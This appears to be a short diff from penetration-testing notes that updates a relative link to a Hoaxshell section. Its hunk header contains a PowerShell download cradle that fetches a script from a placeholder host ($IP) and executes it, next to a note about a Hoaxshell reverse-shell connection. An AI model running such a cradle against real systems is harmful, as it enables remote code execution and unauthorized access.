@@ -96,7 +96,7 @@ iex (New-Object Net.WebClient).DownloadString('http://$IP/$FILE_NAME')
 
 Stablished a connection with Hoaxshell
 
-[#hoaxshell](../../pt/executive-pt/post-exploitation/shells.md#hoaxshell "mention")
+[#hoaxshell](../../pt/executive-pt/post-exploitation/shells/#hoaxshell "mention")
 
 {% code overflow="wrap" %}
 ```bash
